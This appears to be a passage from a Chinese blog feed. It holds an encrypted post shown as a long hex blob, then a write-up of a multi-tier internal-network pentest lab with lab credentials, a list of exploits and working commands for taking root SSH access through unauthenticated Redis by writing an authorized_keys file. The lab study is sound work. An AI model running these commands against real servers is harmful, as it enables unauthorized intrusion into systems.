f90bbed4e8590ea1208c4ba8be6168b38a4c73f4b32281efbf2ee1a22425482457841aae3a0986245baeb0b39c5decf3b0b675565380031c515109bc0bd27e5038b39d8cae3703d83c81417b7e4de68f1eca3f9ef00dc9576dbf024f25e2eab8fd945234605b94031ddaacc6c3b21b2d4f7b8189ecd6c4cecab8a96250da4a5f6ab0ebdb38c5bce48442a373e7f7069daad39bb5d76bf77d5f912138e10375db97c6a6863f826865544e20ca8d6c85c3606b856c9313d7bf744a3cf6900a52a6dbfe12bcdbcc39008c12ef6fc7adf0288a23017bccec8d7b94086350f5741f4514588c5eaef0df1a992ae54b8395571aaeaa3504ac37c73265bac385615310e4e00dc181c2771701387b9baf4e12b8396f0c6b57e63633b18f7c40a155714c5ad45a0cdb866a1c89f7f81e40dae7a6c5362b9f5d20fbe0255c86e2df2c3c0dcc35641a4a62f15ca0f0cacbd5219ceaf599646801b0385bde03ae8d9004a2d3f5ef3c9baef02b105b74c80ecd36e5de50f66571f835488b0f9bcecff2406c227d4b9999d5c87e09e03efc104e626fc7b8f49a246aa9e4f314e6e6236801528df08d50bad55f243dad9832f3980909ed7f58fd491585ab6ef9ff0a352402780a1e3a5ee3b72822af69d2f8e244a55db3826d2b06cba3cb56c423a71a08bafff4349f94e7aa6183269e92c2aedaa7cf5094c4acfe02a1c876af539991abe960907a9de4aa0519ea64981d60a194bdd269151e1aa7acd3b2637d0558f5b223b90454bd4176f88c5530086616572b7434fc66c0c798f844e63c72e8595002f6f4f18fe527bbe05d579adf1ee96101f2611f4fbf064c5b707fae43e9299aa09f7f7d7d925a51ab81930b830ce644997e103c868bdadbc9736a5e44a68264ab00faf6cde56f77dd259f4a79b59ac7c902ee567e9f14bd9a4dff11f8185a198f111dcb8c6a96d8ca03c5d83a6a6b9c06e41b8b0d19afd0b16eec8934d96d21d3777796b0eb0b37ecb5119a185f7b60dcb18ccb1c811fadf5c1bf15af8ec8339ba498e2cf6e18e7143a43016b49d55cdfd4b8a476724e6a3275c4fb4ec5f996a65ed02dfbec14c35d6d019237ba0742658847a8502ef2685b97b6299e6b65bddc731f9e1cd3b779c56199fb977fda5aba2a311f62a2f67e7ff1c3122fdcd4039aeea31bef84def80630fd7ed393fb2b4b0f561c4702683e0c5683fa0fefd15204222fe5ad892337c9a9fa930fdd3d46af22d3946845ee09ff02bb29eb0bff358d3d52c0e567900dca54e5afad62cdeda0a670c67abdeefb008b9a951ca0596d2aac267f2e273a96ec85216927320a58237755437f48a9706d42862d7fb2848ff1d5f75e6d3d6ed875d89046ecd19902647c12e8958a95332bf5a87d6ff906c5ef63cddf753b56a5aed72822e000f92c1884ba868a3c7b86c90243fd892fed6195719b9553cbd2784e0ed763a91c33bb741a434368934b3163c5691f118cf3497111297f3b702d3891011235e07b3913327e928fe2ccb062f15b841979768a875e1c1e7f1a291c1f173140897f0c1b55ba0c3f88a0e3456ae2ce9073c47862f5a95a44c4ebcb667919c1cf8213fcb3e7893ee2b778ba32903345bb4078e0c561f142ff49dbea885e29b6f5b1628340d2858c67ab1255615dd9020b55ea9e89205cb4a83e55c5d962e57d5a22bd66cf719d877d2b53b57a741d75135d2d7c56b723aee8dfefa1f5e4a7700cad7e19c458b81f157c6120d284e3aef36bb36561126551ef72550201484c8c696f47615454b4839c5588f0eff178f4cf6bad7eb50a8d408a350c839a0051c171608ebccf36deb62037adfd3520f90a8835f8a467a45862e7ad7df2036f15eb85bf9e5c02140ef5a005e07ccb3fcbf58eb6cd3893a94b4d51085ebab2c3210c40095d3fd0b1605e2b1fc5e188287cd8b9a1d7c396004c0fb0b00211130a4dedd60c1307b9915e64c3be0bbb506027d06358241a6e507f1d84822a7772218dc1030baeec6f8a28dc95e9497ebc45fe19f77d217be8b147d3f17cb79b037b8a91c8a0593cdbc84f7594c195351c9f751c256064b74b65cafb6e41ac6902b6888c99424760d90010463356f33e5dae60ea792af74891eb45291ee6506132cd6d76db9cc014503d020ceaccc990d019c85698d49517008e5da5caea9c9c6d6c406bbf1e9a12ca5116eaee8767390fb6552fad8be92b092eb085e7cefc5754266ce192ac6ac77d05ba30377a0f1a1de04803805b55111631d0620d8088a5f512100fdb9f7bdb97ccaf655f6eea6e78cff17491fe82a80f5e9daeb4bb11749ab7e7a6225612472fc6aacacc3126e3782b0825e45e5ce64b0af6dd1c3503fd311ca8ad95ad2a98989b21a616b9b3ae5c8bafc2b2279b2b7d5b293097b6dc00a29b1b4b2f836d76a69fd0c46152e62c97e4066dc8a0b87cc7297a6480c89054b361901ef01ea5d158844d469193b662b6a26fea39e4b713eca09ffbeec54ffce492a2b032a1795f99669574375d33cd4885d9ea3c43d503b5b4bbb9dce227ee73ed09f78be5aa61addaa0d771cd2c41eba31dafd75ce976146133beedb0ddc5ce7119e53a750e2fa8ec77afc0bf03fc3bee56ecefe2e3e458206295879d1cbc89f68203a089f306e232d692b95dda77965e36fd2c4fa040616a10a6b214871ea4e98198c60bcf9f7a162f030ba72283f8f1baf2f4cf28973c1d3b813b86fc87cf2d1fa874bac14db24880d26da64597195ae770b7cd65e644286e4314dda129813fe6b6c52bc502184412453dde7ccf2def1bd51604567d0f11574b6fe7df578830a53c043707b5780441e860934f402ef4e761a2387b81b56be1b518f6ec19d58aac0c93b0fc225438d2117f574a23f1409a1c0407cb47616831b6ce904e0af7013e6026e61b2ab8da605e348abc706b88f6039fc038e3ac284df30f2d442b62fcf3b6d92bb28fdd66f6736f4e96027880cb2c225bc81506f278f19c675443f823581cc55fc5dda66029691bbf87727a65177b93e37fd9a7cc50b0ab82fc7c7106b5a30c568b7517e5850b3fa035d74202f8242705f4667e14f6eea5091b63348c9f0277059e26bbcee45ee969c61e79b36b5b6cd2debfe5f940ad0402490484eab3fd0a47d305f2fa63fe277b7b49985f2dd22bdb53e7b96c8abfffb06d7869ce06b7c07bcc5e74ac620bb8a7f6bd9fd16c9b55d300c37b609c5350fa46be806e60a8dbce37d6482a1b5a4f933ee3a0f7401a4db3069e521f0bcc8ea06cbbef70b0e4d76eb598772a0bc203efa73fc50f893d3e1c2f2b0491a797ec41eb82fd7c9878248cc82a81911f7792b92aba104ee895282a5d3ccbf5da697d41004f046e97b3eacd0f153e60764e1459db5d93e6e9fdd1bc997f59cf49cdd096d8755115c826c5f40ebdff61ed4e7b818d6fca6c7cae525486b07f8336e713e1f0b1da0af953c98b9428f04f5ead2c142a1ac33c989cd06308c4cfad2e2eba6ce43de885c6eae7c4ba5210a8d5b0e651c071e8786d01ba3c526b9805f569e12cfdff1b6ac4632693f6da6083f5e0fed96a75df311af69454bcc59254a5e509c16ac93ecdd6405fe6c8139e4b71799bfdff36422909f26911610c297d01e5162cfcdad2e03662d7322938e409affe0823f4c567d5261f3a769e1d5c69eba01be3d968254d9a7668e9956151531bb8b28cec4414209231fc2220c86f4af9dad8f0d054c09e6cfb3b2a808587c21b60942c660ea25361f407063ce3f08beb7b898b421c6fa6a6c4a62392c9a77eecbd3d222269ea5b36bd1254e6ef06f291d300b69825fb812b4b17aaa302b2760b28e388e4f9dcaa85ad9ea07b3c9cefe5b9b5756570e1558531fddbfce702d25af9dca7ce6a78f5460612d641c79a931f32e496f6523fb027297db20c498947ea67429ecac2f1db40452ffcc2551a80bbac18b48c7c944a0afe2c2227aa425f382b984038eb6df21c50ad2a7e8fc490b76ccd1b0528d4940b96d6dc5ec86bfa0bfa290f5e6df47cb565a87d0bfaae9b943a7cf2f0191fc93dc90ebf2f70d284ef847279f594dd9b7250d42a4ed01bd016df44da9719759f866f64f2b2c83f5656fe0dcbb48f1e7083dc3622446bdfabd255dc29d5908d80899567ea43329e7c8151fb9b33386e60d46e6a023b6179444c188c1778e4d2b8c6679b403a772f46f6190c3712681b2ed41a6c738de39d547032dbcaa906f16f0fac0ca4b57148931751e875ab939b180defbac1b4e066244d1c55ffa0b6bef93b803485c44f81e270601b7d05cf93e32f1db8c03b6eae8639566c48d8ef6172aa327ea8e1a33da5778e2a3d507a7c0ca2ccd13a8fc3d997e9f226a8e22cdfea717867fdd4a6dbac5a37ad318bb3399ad2f84a8e9ae00ad8a6dfca3b0ef62a58eb5f836770fa77d4174506b985f6478830d50d128efe699f3bbdf247ecdcdfb2da4b8f80ba48a7a28d8d3cc73622c63eff4c14acbd71397f6f0284ba9417e0595bf2066ab424847c8b7251b41306af733a0a9199932bf2a42847536393ce4ea8d58ac75e675458dd9521aaf4725efd1cbfe31a5eb275ddbf62c246b6b7db277781736b93e9f4673a99c0d0a9766b4d81597268aa67eb4aca1938ddfe2007ebd55b76fa148c078f2f77d34eb661eb9d890763634293da9c60fc592d421d5b8159513c5813616ddb4dbfc863fb9f1414af0bfc8c95d8f3f481ca75243b49a673947607e59aca30988dbe31bffd805fd0532e7e0af4762c78543bf144afcb9fbf447e91ef65cbc4439d56e759c0f22fcc4cef13856177f80a97c859755c32ad909fb750ed2c41bbf7517d19bd0c21d282e3cfe50daad669e8a61563d21e7b06aea5b8e41af766584f8342dc4730c140fc94fa54d3793b6ced60a83be0e4af382096bf2e2293ae22dbd99cdd897fba17b049a14d68d734376bde8283217b2e774400f29bf59249aa1f873ef853b4a98851c1561a5d7a15f1e8ede01e0030251b0a244fcbd392f2c494336d7644f3b8b20df18b6d536d751d271c49459c9f4164321cc364ffb5452a5cf32f905581be59cfaf60286ca0abe4815896e523ff285011e2c76f19010cd949b61119c962aa36c6f225fb86c8fd7520d4a2e37cd9803da3d9777a0b8f42edce91bc905f1ba9b323fa117e9f9254d5dd719b3b1c82a4403d1a24c93b5fe70271ad9e02d31157fe1513993218f879b34cd688beab7b2fb73ec4e07554764ce187834a2c579dadaf46da4a81286429a827ac24b7e9682ea4c860a07c639a91b4ed4e004e0f21cfdb24f403f80e3551a2c072b1ea38150d049bdaa630c2d628398f7b0d8a58a533013911e6d82df59ac1bb1260c2c923e99bb62ed6fbbd4762a2de0822816f800061cff62bc07cb0a50c0c556d5a515df06fd4f6b51edd2ab69910dc2ff5344d16afee1a34a5340662483d9326ead3c4e3c7cba6a38481ab692fce2bedbcada22df26d7715711c32fd314f6b368ef7a05b96174a74fcdbea2b3074a71a0689d08d2c2ae8aa88b1c37acd6bb120b95c9e1310231702d6f9c189b705f6cfa2df613211fc3fff046a6e0f685f1244798e90926c3aac2dd712b5d930c5a1668e9da8e515bdd8611a63431e7fe98a12f85762f3dd04dae403e5cb440bfbb660bba6a1d0d92a927c829bd17c91bb9c3d28d777de7223acbbf1186e49aac87cb7749a9cbc1924257778acd25bf324ae9d650f9627c5898ace36a25d25834b645261583234cac572d974c76ac760e4c70073095206518aa05c87625598bb3d05abe8b6ba628819333acff1b3994b98d4c7bfd8a690f358cf8c3f22302790561f6391a5053901e2c7159fa4c6305090155454d5a01352b34a17c6622e97f05e04b7782e1e501bce2d15be73bd3a3bf25209e67fa6dfeb2e21fe4e39bbe39b78b653aa078f592012be3994b756fed2611bb0f9b78b6dc4c1c35629a13056cabdb98b93f65e45099c82d738e39ac09dab43abe7bef39959dc80116a89b4be0c97f52fb031cf2a66e8250fdbd327cd4aa071b6bea5b91b6412671ebd5e5af26bfb7435e354bc799cb17dc649777b2f498910469839766866c8b56d146336f295b2d2e072c206a8fd70881a41b7a3d663334a7fee84483b9ff57ad0652837b6f36864f5a7f764a448fafba8ebe76fd25af4da956f3cd948135e46c4db04c8e9d468b96d962ab4a2435aab70417af2d1c4b85d84980b390c35a3839dc6f3a07721cf463f70ac640c01bac28d282af21c63e595a0959d62ae5b6eb33d60a6c8f38cc951a50efe28450d8e71d4de8b949d92e65f9324f21a9e9b0b1f69755cb63d99122cb928cca927f255d6aa78f413ef52d902a281a7950b09d6da4ad29903c9584180c97ace86e6e98372d8f34cf119b829e1c993ff076487f916178c83ed71f0cf771e9724c2efbc4489f41ce31c2dd6d0ca604d5eb5c8ba261c2526e14316362f04d78610d6c18e9449a27dac456316ca2f2c32695f1c68be62ac1ff29085ba5c9629f230469ebd072e67ea53c435e11225672efb74a042a48014aaa2be5dca0e0aa02d464545e0e322353b6d336aa04f14b2ab3209714b7fc0fdd8fc1149cb3efd91fcfdd0c15746a69412cd3d159e374b0186b15ed85bbd38e4478dd77814af8a1294a009d1c391ced5df15500064bcf92a97cb57c337084da31c092e6af64a20444e5f7a068bbadd06ecf872881b539d88e302230e1f66fa1bb30d69cacc4038237689d2f9c3921ae10f55a430e9143ff09b3d6ed1434e11a9d319ef5b88507424946a02253b2a8565efcd090a35a78b042784061e16b8ebc515eebe97c85b2104f0704e0387a9b1a2d42f3f4dab1cdbea3f48f1d78a2dc4ddeb1e8f2e077d28377a543b6e834e98f1f1072d9795818ab082c7c644347a5244280fd7af795c068e85810e75a4dd77e30c8d0a9e49be5a8bc9332c10be535dec68e0dff3718858d504d0e3ecdba14348c83ed8da66b5eb450e172491e342196870d587e1761c65fc429b1ecacd91e60f4fdb4f8ccecc370b7d07e148f870e2f0581ab0d4def798472ae34c5a14674b74632cd803bd4489e5bbfd38c8a1a53fc3d7ef9d137563375715456c97fcd32dd7874361ffc55d17862d185b9aa9f40d52094dcf18b62268f55e202329814fffb997778530c38e9ad08ecb056d3101144cb792d5ce4aa0989518f88c4765959cb2fc2c85a30914caf848c1df820c2cebde2f470e57965cca2960b1529924a0ab1043c859295f8926fd7e84d706a7f2a87bcadb55f43411b59140d91fd8af321bcc52b83742ed21f749dbffb44f640319b5e2f9cef3d137ae3fb5f74642cd9c50e8a6b8640369d93600ce5dcee3873d82e13162bc3b65afbd8bd60d5a0f3ca9a603eb588dc2b1c9a7e4b822974bbcd944e6346822b263cf008795f8b2ee2b8d352d5969ae462c84c7c044603071d3c29607cddcb559878f1a03b820cf617441a3fb24e2e2f2b1770daff779b5588a0b7d0568b92787bff8809dba433d7bb5d3baf3b67f369156e14d39797fc3287f31d429e9c90a79563e5851a1982f4ed16a791b222b0a1a02ce6ed030ffc115adf7511414e730baffee7846d09961523efef5a03dddc316210d24aab7b2209071c6d150416670332efc2f56a5746751c6880dddd161aa96c72aff4526ea49c1275f1f5c4f9de65e5c8e9bdd8efaefe31ba1200aaf31bc4b07a926a32e627bc7f2b280d4055f61c32134b393c6646dd7e1bd28f64dbf3529a095ce4f5bfa8961ce3f2ef7acc702370fd266f88f5fc68abd20efc0d11ce78f71bf6352a92f1f1865728d326095654ad3ee32ef39811b60ea06b5ac94e15b3f74578d3abce1f6da132eb2a91721f699651a57df453c77431ed86afaa793e85da2d397b9626b61c825224b0690cf7ecebd1dc3416119f6fa17358097bfcc42bea4ef11b45d788c03821732032742826094dd14b3db3fc48ddec5428df688b66f5108ad0881c615445a8f70ebeda1a6176d0e0ae46646ed320479dbf11bfe769df91e28f6b0317116e0d79c90bccbcb4f2a6970790f53f0807d18ea6507927a72dacb3e04122b667498ad4f1744b0cd171d7eb4ad028a4553033d2d9002815bfda610c8fb43f12c2a7e824f489dee2cd4d8a86cc85fa0953f9b2005b80a9847df9ef9198fa8ba10e8fd7692567d7a88dc237ce7df9e6c9662fd5d2baa82286c131bbbfb67e075c2dd6d0fe7a96388d2c9fc21def80c8ca33e06e116c666e4d5ded3b8f6f06c4a61bf5595f09cd6f4213e57f15a19f276d36f3d916e3c5d80f8090aa6b3c78c7557f1ba0157bc7eb2d44de106b82086e876758326b29edf6d87fe1f9efa2afd93b646b057912bb281f6339cea85457b16be1a8c2f31bdbe150a69e7660c172bdef8b7de81eb59ebb76014c50c7c52b808c0671eec43424c97bc7a37407743f18ed2b628737c92c7a43dcc52829a6d8cc3bc930195420fdeae8066e48f2b59020b3b4e315f0cc383657211f07175dc0b580fff766722dc334a8bba7a7c540d09f00215a4ed351735c20e0e38b2a7e09fe25bd0978a69441e785b522f4d3079e2f9a7e97786ec67d30fa2bc7442e715be17dbf6cb69a25c614788acf773de21dee99c6aef835078f7d58e032cef9f01b79fc3d1177e24c0f7219911513490ec1fa719fdba2a024b59d6357bd88f12b60812a9c3798679da6dee41ea5881767faec4a8308a84e8009d30dd91b4a26d589ba2b05e8a72e9c16f359eed90fd68bdd6601013369116d195ba48bc5601bab603fe1a79361571acf0db7a921ce47b2ba6ed4e346ae20b1d892a620b6eb3e336bcffdaf7efb273e969f51361152e5ff5017b7fc6bf2b16f2b72b3dacd22896ab5a12440c320ace655dcd2868a59249dc813fb58b9b1d258faf2d04cbe541ba701e28c683be5bc8c8089eff6e53ab141f4a73bf4b4832dc4777f2900dfbc7592c6a30458cbe8193183aa5a40485743355f675bc87e45a7f5db878d846ca6b62e7f383bab087d3bf81dab232586ba70197c14dc00201bab7fbc35a38a998484b8a2c3b605d3fc0ce1cd7f6590a64054b1e3bd017f659851191668539a8a81b16ac702ed1090a03b9a7db5eb1ba8c4ceb416f8191d940da90ac7e9d0bd2c7cda37c392ba0b3b2d74f3bde6a04bdc8f19a09c7a587cb9941a18a1cc155d25e4ca02aceceffc32ce32c0aea7fc8d45cc0085f7d61f346b7cd2ff75b2d22c474264b92ea7d59319b08f1c3a956b5d0df523d467fb9a1eefc00ecb3a32aeda28baf5567b1d2d4364951f17e12a274c05bf072a2e8a8b121e86f1c99c49eda812172ea07749d6a20b5b1f732b54f0780b4e84706bae3c802f496ac19984da1b05128855d6c1e3daf42851df5987a3db9581a304ba1327f6b6092b205d5412e99adefbf5c10f01b4016aa12af85c21111726fc53a76012b23507bbca9991f180c6983c39c6db79dc5cd0998bafc07b68b3384231010c12c90e9f824fc109d13f3e3123c7dfbfdad9972879081f44a840c3a042bd535041fb7c5c24d19d6e4ecadd5d544287fd6e40467c6f482ea9bc1d56bd9a1c1bdb32d5ca4bcba385176ec82b47463de24e2b106bd31a1f1f6b26336066954669c7215a3ef9fd84a2554ec6fb4e079383b00b84db292c79ebe3d936bb79b3a6e90df770cddc285d7c13559ff247d1bc0b64fa68aac26ac929b0878971179595d34dfd5cf0f30ae641f0fd78b50d4065aed0a9032335257e35ec015cb282b05ba39ccd4eeb3ff7bd80ea950ddc3c2d28de35572d8de8459b633bb97996c9d3dd4106944300d0a27f3b52b72ba09ea83622b9ad0b76b6b3c94da799315e53da9a69733b097e41080d74786ec2800982b1854c14e8c2ca8e626a4c9bbec96d3e629751dc024ca57515511e0fd74ee13f90332c738510263128906b8a4e778b9cd99d2caa2c11fbad90f9081105bb38bd7f6e41e8f28b6078de302265d753cd06fb99db55ec2f9b5f01a7e9938f57cd7abcb09eb48ea701ec4923630dc299487f9978c32fbbdc09ac483110fd5f0918b1ca7c282f12ff6d34c4406a5817dbc6ad196417f83422d31576cc7e728133b5f2fc0b0f4ffe03cb3de9a554a1050eaee5967cd48ed828d9ed2060327ae22db39d7ffc5aadde9c22ba24b8f5ebff8031dedbf3d175b65b93c8d112783851cc0499ffbfea6065c601a230bd0663a10d91203c49df1040db5d3222a3640ae410b9d97f4470fa381d7593cb3125bfdda4fd18f2cf23fc81c2b01592419d8fceba20e7c3eb652eeafec25c1105cecd7393ef6c7fe2f23075498f381a3f84fc8a3b130994ad240d270d5f1c153ea43d4fdd41a196f088d6302a7fc356cd5b2ab3bb2f72a8beadaa49674df8d5ed30200aeddb41729c0deae768ec55646401ef6a2260aa03b77fee88b1c468a9cc3e065706a75c9ed48ca67adbc4900c3d66bf8789acc9a617137ef078ae7ffede94dbcb43901963bd406d4d3eb665e440746005d54ce27b8a887d1a1e8de40dba536a78d735ab506b39cf54b864e38d736f0100880ebd40b5634ed3347aba62d113f7605e8d07f60121fd96c98540fd5b103c52cd24bf93c36b62233267cda08a1ff2522726c2af3c1c2bc04f9a01306c1ad28a079c78bef5331124575ad5ff50013c5a4233ed5f3429876ef906fb2b87090bb137e4808348e25ed90d71da852600bec823492535c68bcaa68c032ba3369efcc125b420e7ba3eb881de5600cc3b9e7ac6a90a23be965720b4320c9f4ae39a25ca490691fa3b024148ee3a7b31808ac5d3df01749a8ee2464e09d417590e1325459ebfb5c8400c61ef2361f60f52fc283f879cb9d3dd8323fb56f47cdbf8f3742d761744fa1dab67723c4caa2ac326bac189ad8a1a47105f8a59c93375852a089f3da1009c9568797e2ad2e6b07ee8ca85f6dee1b56d7a7f5f49a9212c0e91ac3fef5929e213da5df27d17f402957ed03c8a8bae8a2f3f90765d80610e4c9b980c9c7a3b6c16ab4ea632668a8fe3d46e4cec4275849498f9abaf0b06d0f0b8cb77cd6cc50c7d4604e2da1190dbe50d0c7618aa9a6ab31ce84d735014be5601fdced84098591ea4dff1e716823c8afc9c884d20f543b25d86405d6c18171ccd92ea39fb761dd8d9b65606005061ae041f2e0523e3ec711c068d54e2e343d6b7f02176ef4380c67f53fc640645801246f8dc3b4f9ff251c948d38b27b593eab6a84eeab9998e5e381df7ee54381eba886bfd6ca765a5c8cc0763d043c5a5b1ab909ef27368b2780566a15a66d0941a41b03334d38b9891a3003a6bd121fa0dc1caa0b90eb2a04de864c38d1656802812c1f26963f96053f252a34d45f9f9d32412a8fa38c7027686a1eb8b11c355f04c158c4ae7401d28c7e613b8044be6e255e0cb713e0b6dd10b8bc38f822daa84b56d583081d1855ac136483aa70f5a93436395464a094b048dfd4f3a86398eabd12eba891f39129fbfad3bcf9d981ab74c67a74fd737a118d22ba31bdc915801b60c2ccf9a0d254c87c3a8ba708c19ba8b824d9178692e868e9bb1dac337a748423e02e71f9795a260489a240c7cbc544fab95703b19e4822248cf43d12e8ef4908c97e69df751332f27473e0b689b02d5d2ae6a48b024debb4795ec6519485c07e34407880d7a2a1893846312e9aa709793ab1625259d05d81c412fdabbdf1c6357d1a6b5e6201d6d553f7bedea889248db650f0925e6f217a031be9451746e4ba957356ad4d1b59546795ba715ba2916d5ad73f0e9ec835060a3a87bf59e1a3eb7c103620686dd8a029d37d1a2e0ed965f96f7a1cf9229c5afebbd3dc857a23514367f06d174ba348284ef3522ad109315ac2f1d9eb7c3977aeb939d82e6638269529a5b74a99ca27a96fc853af00654347c7dc8f17d4d0789e96f40b9357140991b287b9794149a2a1d246cb082956af3e5162bfe63b20f9e1dafed03186f3b060c7dba4ab2c089bdac10c1ac975b3655afdc8f44d0b25f2779f71edd73c4423e9f1adf733b07846de759f12774ca059ce5310d8a0d17d3373e0bb51702fec96ac5cfc34600ac19d83b60aa5df39bc8e47e68aba4bd77327203b122fc05cd4a7dfdc833848d5d6747c05e1ae6393ed5007b496ef53b3b62123e637f32efda40453d3184f73a66d2c4362f04abe20e2d723539a8bcca03ac019743e5159647eb2518393e1fd855f50cc0c580336e0f3c61706835a13b6d053fd7b0323642da3458e643823f228a4bd9e99d24d62ec0529bac22dbad4ed572af6c69b1a26a63401092aa688bf4a9aab9870d09d2ace16264f4047681594b34878a369114d6a650c2b27f6ed35c7c3c437adb57af063ef25251857b059d60a81327a2b1b710ffb78d762ff7bbc0649c558262b31aab28948e027d8c428160e64172dad2789883ce35e70c5eb07d534d1114d8d7e551bd54cc8bf4dd6cf72ecc3ef0d960df302c70e1a769698ac6cfc4c658ec9ff60777dcc533a207a236e74f6958d1091c98932d98a92e013b119c0ee2743cb27a115430b318bb75559a06b88bec5d49d908a95930b94c804371a13ecd7a5be9df6fda5c5186cf9619ab385ced93f1ea6cce545b11a658aa8b43b5c45544eaa9caac0eb2fa7d49d9ea785736fd5ccfdf6a2a68f0e2d927c9d4205b0fef66fa353d438371d8da3f9de50a779abc6b002d2f65e546988cf24ee36967ce4f3a9f198a8aa0065594c666c47ccae7a106388efac67363565</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透靶场学习之路</title>
      <link href="/2023/02/07/nei-wang-shen-tou-ba-chang-xue-xi-zhi-lu/"/>
      <url>/2023/02/07/nei-wang-shen-tou-ba-chang-xue-xi-zhi-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="内网渗透靶场学习之路"><a href="#内网渗透靶场学习之路" class="headerlink" title="内网渗透靶场学习之路"></a>内网渗透靶场学习之路</h1><pre class="line-numbers language-none"><code class="language-none">首先我们拿到一个域名，然后开始渗透，加油兄弟，你能行的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669371858436-eb89821a-8994-461a-84d3-fc2ba055e29e.png"></p><pre class="line-numbers language-none"><code class="language-none">具体配置如下：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669371948883-f1076767-1eb1-4bff-b42c-b05d1c0eb70b.png"></p><p><img src="/images/1669371982328-b76049d7-6958-4cd1-a1ac-2df562057423.png"></p><p><strong>DMZ区域：</strong> </p><pre class="line-numbers language-none"><code class="language-none">给Ubuntu (Web 1) 配置了两个网卡，一个桥接可以对外提供服务；一个连接在VMnet8上连通第二 层网络。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>第二层网络区域：</strong> </p><pre class="line-numbers language-none"><code class="language-none">给Ubuntu (Web 2) 和Windows 7 (PC 1)都配置了两个网卡，一个连接在VMnet8上连通第二层网 络，一个连接在VMnet14上连通第三层网络。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>第三次网络区域：</strong> </p><pre class="line-numbers language-none"><code class="language-none">给Windows Server 2012和Windows 7 (PC 2)都只配置了一个网卡，一个连接在VMnet14上连通第 三层网络。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>服务配置</strong> </p><pre class="line-numbers language-none"><code class="language-none">靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应 的主机上启动靶机服务： DMZ区的Ubuntu需要启动nginx服务：redis-server /etc/redis.conf /usr/sbin/nginx -c /etc/nginx/nginx.conf iptables -F 第二层网络的Ubuntu需要启动docker容器：sudo service docker start sudo docker start 8e172820ac78 第三层网络的Windows7(PC2）需要启动通达OA： C:\MYOA\bin\AutoConfig.exe 域用户信息 域用户账户和密码如下: Administrator：Whoami2021 whoami：Whoami2021 bunny：Bunny2021 moretz：Moretz2021 Ubuntu 1： web：web2021 Ubuntu 2： ubuntu：ubuntu 通达OA账户： admin：admin657260<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>涉及到的知识点：</p><pre class="line-numbers language-none"><code class="language-none">信息收集端口扫描 端口服务识别 漏洞利用漏洞搜索与利用 Laravel Debug mode RCE（CVE-2021-3129）漏洞利用 Docker逃逸 通达OA v11.3 漏洞利用 Linux环境变量提权 Redis 未授权访问漏洞 Linux sudo权限提升（CVE-2021-3156）漏洞利用 SSH密钥利用 Windows NetLogon 域内权限提升（CVE-2020-1472）漏洞利用 MS14-068漏洞利用 构建隧道 路由转发与代理 二层网络代理 三层网络代理 横向移动 内网（域内）信息收集 MS17-010 Windows系统NTLM与用户凭据获取 SMB Relay攻击 Psexec远控利用 哈希传递攻击（PTH） WMI利用 DCOM利用 权限维持：黄金票据 白银票据 Sid History<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>好，准备开干</p><pre class="line-numbers language-none"><code class="language-none">nmap扫描站点ip看到如下端口，可以做的事有很多，可以看看web服务站点是啥服务，还可以进行ssh端口爆破，还有可以看看redis服务有没有漏洞啥的<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/1669372297961-6771e14b-806b-404e-be66-e7ca0f487de2.png"></p><p>通过访问发现81端口开了一个Laravel站点，经排查发现此zh站点存在漏洞</p><p><img src="/images/1669372911939-cb47c0cf-1915-48e3-9009-5491cdc42d97.png"></p><p>还有一个redis未授权访问，我们可以直接往ssh写私钥</p><p><img src="/images/1669372994813-1876ab13-20b0-4e52-bed2-deb3303b9d3a.png"></p><pre class="line-numbers language-none"><code class="language-none">先用root账户登录，记得把ip地址改成自己那台redis服务器的地址ssh-keygen -t  rsa #生成公钥(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") &gt; foo.txt #将公钥导入foo.txt文件cat foo.txt | redis-cli -h 192.168.213.170 -p 6379 -x set hello #把foo.txt文件内容写入目标主机的redis缓冲中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669373481044-df000e5c-8ad1-4f67-91f8-f3aac4c9a201.png"></p><p><img src="/images/1669373683253-eb67dfea-52c5-4c46-ac84-d097c669ebc4.png"></p><p><img src="/images/1669373696566-78ab4d99-1973-4f5e-8388-d80a00ee19d1.png"></p><pre class="line-numbers language-none"><code class="language-none">然后连上那个redis server进行设置config set dir /root/.ssh    # 设置redis的备份路径为/root/.ssh/config set dbfilename authorized_keys    # 设置保存文件名为authorized_keyssave    # 将数据保存在目标服务器硬盘上ssh 192.168.213.188 # 连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/1669373955592-7be7c8bd-3710-4420-83fe-57995b76717f.png"></p><pre class="line-numbers language-none"><code class="language-none">此时就可以用ssh直接连接它了，就问你香不香，美滋滋<span aria-hidden="true" 